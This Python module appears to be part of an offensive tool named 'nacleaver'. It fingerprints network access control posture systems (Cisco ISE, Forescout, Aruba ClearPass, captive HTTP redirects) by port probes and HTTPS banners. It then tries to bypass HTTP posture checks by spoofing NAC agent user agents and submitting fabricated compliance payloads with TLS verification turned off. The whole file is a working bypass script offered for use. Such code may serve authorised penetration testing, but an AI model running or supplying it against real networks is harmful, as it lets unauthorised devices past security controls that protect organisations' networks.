import logging
import socket
import time
from dataclasses import dataclass
from enum import Enum

import requests
import urllib3

logger = logging.getLogger('nacleaver')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class PostureType(Enum):
    NONE           = "none"
    HTTP_REDIRECT  = "http_redirect"
    CISCO_ISE_AGENT    = "cisco_ise_agent"
    FORESCOUT_AGENT    = "forescout_agent"
    ARUBA_CLEARPASS    = "aruba_clearpass"
    UNKNOWN        = "unknown"


@dataclass
class PostureResult:
    posture_type: PostureType
    posture_url: str | None
    bypass_attempted: bool
    bypass_success: bool
    details: str
    error: str | None = None


NAC_AGENT_USER_AGENTS = [
    "CiscoNACAgent/4.9.1.14",
    "Aruba-OnConnect/6.10.0",
    "Bradford-CampusManager/6.0",
    "ForeScout-SecureConnector/5.0.0.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
]

FAKE_POSTURE_PAYLOADS = [
    {"status": "compliant", "av": "enabled", "os": "Windows 10", "patches": "current"},
    {"health": "pass", "antivirus": "active", "firewall": "enabled"},
    {"compliance": "pass", "agent_version": "4.9.1"},
]

_COMPLIANCE_KEYWORDS = {"success", "compliant", "pass", "allowed"}


def _tcp_probe(host: str, port: int, timeout: int) -> bool:
    """Return True if TCP connection to host:port succeeds."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        result = sock.connect_ex((host, port))
        return result == 0
    except (socket.timeout, OSError):
        return False
    finally:
        sock.close()


def _http_get_text(url: str, timeout: int, ua: str = "") -> tuple[int, str, dict]:
    """Return (status_code, body_text, headers). Returns (0, '', {}) on error."""
    try:
        headers = {}
        if ua:
            headers['User-Agent'] = ua
        resp = requests.get(
            url, timeout=timeout,
            verify=False,
            allow_redirects=True,
            headers=headers,
        )
        return resp.status_code, resp.text, dict(resp.headers)
    except requests.exceptions.RequestException as e:
        logger.debug(f"[posture] HTTP GET {url} error: {e}")
        return 0, "", {}


def detect_posture_check(
    gateway: str,
    obtained_ip: str,
    probe_timeout: int = 5,
) -> PostureResult:
    """Run all posture detection probes and return the first match."""

    # is HTTP traffic being intercepted?
    try:
        session = requests.Session()
        response = session.get(
            "http://1.1.1.1",
            timeout=probe_timeout,
            allow_redirects=False,
        )
        if response.status_code in (301, 302, 303, 307, 308):
            redirect_url = response.headers.get('Location', '')
            logger.info(f"[posture] HTTP redirect detected → {redirect_url}")
            return PostureResult(
                posture_type=PostureType.HTTP_REDIRECT,
                posture_url=redirect_url,
                bypass_attempted=False,
                bypass_success=False,
                details=f"HTTP {response.status_code} redirect to {redirect_url}",
            )
    except requests.exceptions.RequestException as e:
        logger.debug(f"[posture] HTTP probe error: {e}")

    if not gateway:
        return PostureResult(
            posture_type=PostureType.NONE,
            posture_url=None,
            bypass_attempted=False,
            bypass_success=False,
            details="No posture check detected",
        )

    # ISE registers port 8905 for agent communication
    ise_port_open = _tcp_probe(gateway, 8905, probe_timeout)
    if ise_port_open:
        logger.info(f"[posture] Cisco ISE detected: {gateway}:8905 open")
        return PostureResult(
            posture_type=PostureType.CISCO_ISE_AGENT,
            posture_url=f"https://{gateway}:8443",
            bypass_attempted=False,
            bypass_success=False,
            details=f"Cisco ISE posture port 8905 open at {gateway}",
        )

    # also try HTTPS fingerprint in case 8905 is filtered
    status, body, headers = _http_get_text(f"https://{gateway}:8443", probe_timeout)
    if status > 0:
        combined = (body + str(headers)).lower()
        if "ise" in combined or "identity services engine" in combined:
            logger.info(f"[posture] Cisco ISE fingerprint detected via HTTPS")
            return PostureResult(
                posture_type=PostureType.CISCO_ISE_AGENT,
                posture_url=f"https://{gateway}:8443",
                bypass_attempted=False,
                bypass_success=False,
                details="Cisco ISE detected via HTTPS fingerprint",
            )

    # Forescout SecureConnector listens on 1040
    forescout_open = _tcp_probe(gateway, 1040, probe_timeout)
    if forescout_open:
        logger.info(f"[posture] Forescout SecureConnector detected: {gateway}:1040 open")
        return PostureResult(
            posture_type=PostureType.FORESCOUT_AGENT,
            posture_url=None,
            bypass_attempted=False,
            bypass_success=False,
            details=f"Forescout SecureConnector port 1040 open at {gateway}",
        )

    # ClearPass guest/posture port
    clearpass_open = _tcp_probe(gateway, 8081, probe_timeout)
    if clearpass_open:
        status_cp, body_cp, _ = _http_get_text(f"https://{gateway}:8081", probe_timeout)
        if status_cp > 0 and "clearpass" in body_cp.lower():
            logger.info(f"[posture] Aruba ClearPass detected at {gateway}:8081")
            return PostureResult(
                posture_type=PostureType.ARUBA_CLEARPASS,
                posture_url=f"https://{gateway}:8081",
                bypass_attempted=False,
                bypass_success=False,
                details="Aruba ClearPass detected via HTTPS fingerprint",
            )
        elif clearpass_open:
            return PostureResult(
                posture_type=PostureType.ARUBA_CLEARPASS,
                posture_url=f"https://{gateway}:8081",
                bypass_attempted=False,
                bypass_success=False,
                details=f"Aruba ClearPass port 8081 open at {gateway}",
            )

    return PostureResult(
        posture_type=PostureType.NONE,
        posture_url=None,
        bypass_attempted=False,
        bypass_success=False,
        details="No posture check detected",
    )


def bypass_http_posture(posture_url: str, probe_timeout: int = 5) -> bool:
    """Attempt to bypass HTTP posture check using fake agent headers and compliance payloads."""
    for user_agent in NAC_AGENT_USER_AGENTS:
        for payload in FAKE_POSTURE_PAYLOADS:
            session = requests.Session()
            session.headers.update({"User-Agent": user_agent})

            try:
                resp = session.post(
                    posture_url,
                    json=payload,
                    timeout=probe_timeout,
                    verify=False,
                    allow_redirects=True,
                )
                if resp.status_code == 200:
                    resp_lower = resp.text.lower()
                    if any(kw in resp_lower for kw in _COMPLIANCE_KEYWORDS):
                        logger.info(f"[posture] HTTP posture bypass succeeded via POST with UA: {user_agent[:40]}")
                        return True
            except requests.exceptions.RequestException as e:
                logger.debug(f"[posture] POST attempt error: {e}")

            try:
                resp = session.get(
                    posture_url,
                    timeout=probe_timeout,
                    verify=False,
                    allow_redirects=True,
                )
                if resp.status_code == 200:
                    resp_lower = resp.text.lower()
                    if any(kw in resp_lower for kw in _COMPLIANCE_KEYWORDS):
                        logger.info(f"[posture] HTTP posture bypass succeeded via GET with UA: {user_agent[:40]}")
                        return True
            except requests.exceptions.RequestException as e:
                logger.debug(f"[posture] GET attempt error: {e}")

    return False


def detect_and_bypass_posture(
    gateway: str,
    obtained_ip: str,
    probe_timeout: int = 5,
    verbose: bool = False,
) -> PostureResult:
    """Detect posture check and attempt bypass if applicable."""
    result = detect_posture_check(gateway, obtained_ip, probe_timeout)

    if result.posture_type == PostureType.NONE:
        if verbose:
            logger.info("[posture] No posture check detected — no bypass needed")
        return result

    logger.info(f"[posture] Posture check detected: {result.posture_type.value}")

    if result.posture_type == PostureType.HTTP_REDIRECT and result.posture_url:
        success = bypass_http_posture(result.posture_url, probe_timeout)
        result.bypass_attempted = True
        result.bypass_success = success
        if success:
            result.details = f"HTTP posture bypass succeeded at {result.posture_url}"
        else:
            result.details = f"HTTP posture bypass failed at {result.posture_url}"
    else:
        result.bypass_attempted = False
        result.details = (
            f"Agent-based posture detected ({result.posture_type.value}) — "
            "manual bypass required"
        )

    return result


if __name__ == "__main__":
    import sys
    from rich import print as rprint
    from core.utils import require_root, setup_logging, get_iface_ip
    require_root()
    setup_logging(verbose=True)
    if len(sys.argv) < 2:
        print("Usage: sudo python3 core/posture.py <iface>")
        sys.exit(1)
    iface = sys.argv[1]
    ip = get_iface_ip(iface)
    if not ip:
        print(f"No IP on {iface}")
        sys.exit(1)
    result = detect_and_bypass_posture(gateway="", obtained_ip=ip, verbose=True)
    rprint(result)
